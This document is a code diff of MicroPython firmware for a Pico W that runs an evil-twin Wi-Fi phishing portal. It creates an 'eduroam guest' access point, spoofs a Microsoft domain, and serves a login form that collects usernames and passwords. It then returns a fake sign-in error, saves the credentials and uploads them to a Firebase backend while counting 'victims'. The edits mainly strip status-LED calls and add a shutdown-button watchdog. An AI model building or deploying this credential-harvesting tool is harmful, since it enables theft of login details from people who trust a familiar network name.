@@ -9,50 +9,42 @@ import network
 from reset_wifi import reset_wifi # Disables/resets all WiFi interfaces
 from send_data import upload_wifi_data # Sends credentials to a backend
 from victim_counter import *
-import sys
-import safety
 
-# Pins mapping
-
-LED_R = Pin(6, Pin.OUT) # Capture mode / setup mode
-LED_B = Pin(9, Pin.OUT) # Transmission mode / AP mode
+LED_R = Pin(6, Pin.OUT)
+LED_B = Pin(9, Pin.OUT)
 LED_W = Pin(4, Pin.OUT)
 
-LED_R.off()
-LED_B.off()
-LED_W.off()
-
-BUTTON = Pin(13, Pin.IN, Pin.PULL_UP) # Emergency stop button
-
-HC_TRIGGER = Pin(15, Pin.OUT)
-HC_ECHO = Pin(14, Pin.IN)
+BUTTON = Pin(13, Pin.IN, Pin.PULL_DOWN)
 
 AP_NAME = "eduroam guest"
 AP_DOMAIN = "Microsoft.com"
 AP_TEMPLATE_PATH = "ap_templates"
 WIFI_FILE = "wifi.json"
 WIFI_MAX_ATTEMPTS = 3
-user_WIFI = "iphone_xr"
-PASSWORD_WIFI = "C-982927"
+user_WIFI = "my_wifi"
+PASSWORD_WIFI = "its_password"
 
-# Led functions
+def shutdown_watchdog():
+    BUTTON = Pin(13, Pin.IN, Pin.PULL_UP)
 
-def activity_light():
-    """Makes the white led blink to indicate activity"""
-    LED_W.off()
-    time.sleep(0.01)
-    LED_W.on()
-
-
-# Wifi stuff
+    while True:
+        if BUTTON.value() == 0:  # Button is pressed
+            print("🛑 Shutdown button pressed!")
+            LED_R.off()
+            LED_B.off()
+            LED_W.off()
+            # Optional: disable networking or clean up other hardware
+            utime.sleep(0.5)  # debounce delay
+            machine.reset()  # or machine.deepsleep(), or just loop forever
+        utime.sleep(0.1)  # Check every 100ms
 
 def machine_reset():
     """Reboots the Pico W"""
     utime.sleep(1)
-    activity_light()
+    LED_R.on()
     print("Resetting...")
     machine.reset()
-    activity_light()
+    LED_R.off()
 
 def setup_mode():
     """Activates the captive portal mode:
@@ -62,27 +54,22 @@ def setup_mode():
     - Collects Wi-Fi credentials through a web form."""
 
     print("Entering setup mode...")
-    activity_light()
     
     def serve_static(request, path):
-        activity_light()
         """Serves static files (CSS, images)"""
         print(f"chemin d'acces : assets/{path}")
         return server.serve_file(f"assets/{path}")
 
     server.add_route("/assets/<path>", handler=serve_static, methods=["GET"])
-    activity_light()
 
     def ap_index(request):
         """Servers the homepage /"""
-        activity_light()
         if request.headers.get("host").lower() != AP_DOMAIN.lower():
             return render_template(f"{AP_TEMPLATE_PATH}/redirect.html", domain = AP_DOMAIN.lower())
         return render_template(f"{AP_TEMPLATE_PATH}/index.html")
 
     def configure_wifi(request):
         """Handles WiFi credentials submitted through the form"""
-        activity_light()
         user = request.form.get('inp_uname')
         password = request.form.get('inp_pwd')
 
@@ -97,15 +84,12 @@ def setup_mode():
         print(f"Received user: {user}, Password: {password}")
 
         with open(WIFI_FILE, 'w') as f:
-            activity_light()
             json.dump({'user': user, 'password': password}, f) # Store credentials directly in wifi.json
 
         # Reboot device after sending response
         _thread.start_new_thread(machine_reset, ())
-        activity_light()
 
         return "We couldn’t sign you in. Please check your credentials and try again.", 200
-    
 
     # Route unique
 
@@ -113,7 +97,6 @@ def setup_mode():
 
     def ap_catch_all(request):
         """Catch-all route for redirection"""
-        activity_light()
         if request.headers.get("host") != AP_DOMAIN:
             return render_template(f"{AP_TEMPLATE_PATH}/redirect.html", domain = AP_DOMAIN)
         return "Not found.", 404
@@ -131,26 +114,23 @@ def setup_mode():
     dns.run_catchall(ip)
 
 
-# Main program
+
 
 # Démarre soit en mode application, soit setup
 try:
     # Checks if wifi.json file already exists
     reset_wifi()
-    activity_light()
     print("Starting in application mode...")
     os.stat(WIFI_FILE)
-    activity_light()
     print("File exists, loading wifi credentials...")
 
     # wifi.json exists, the code continues from here
     with open(WIFI_FILE,"r") as f:
-        activity_light()
+
         # Reading credentials from the file
         print("Credentials loaded")
         wifi_current_attempt = 1
         wifi_credentials = json.load(f)
-        activity_light()
         print(wifi_credentials)
         
         # Tries to connect to a predefined WiFi connection "user_WIFI"
@@ -167,44 +147,36 @@ try:
                 break
             else:
                 wifi_current_attempt += 1
-                activity_light()
 
         # If successfully connected to "user_WIFI", then sends the captured credentials to Firebase
         if is_connected_to_wifi():
             # application_mode()
             print("Connected to wifi, IP address", ip_address)
-            activity_light()
             upload_wifi_data(user, PASSWORD)
-            activity_light()
             print("Credentials uploaded to Firebase")
-            _thread.start_new_thread(start_display, ()) # Display the current amount of victims counted in the database
         else:
             print("Bad wifi connection!")
+            # os.remove(WIFI_FILE)
+            # machine_reset()
     
     # Cleaning the leftovers
     reset_wifi()
-    activity_light()
     utime.sleep(1)
     print("🔁 Restarting device...")
-    activity_light()
     os.remove(WIFI_FILE)
-    activity_light()
+    LED_R.on()
     machine_reset()
+    LED_R.off()
 
 # If any error occurs, cleans the Wifi state and lanches the captive portal for setup.
 except Exception:
     print("⚠️ Could not connect to Wi-Fi. Switching to setup mode...")
-    activity_light()
     # ❗ Désactive AP mode s'il est actif
     reset_wifi()
-    activity_light()
     setup_mode()
-    activity_light()
     # ✅ Lance le serveur
     print("Starting server...")
-    activity_light()
-    # _thread.start_new_thread(safety.shutdown_watchdog, ()) ℹ️ This line cannot be implemented on current hardware due to lack of cores.
-    activity_light()
+    _thread.start_new_thread(shutdown_watchdog, ())
     while(True):
         server.run()
 
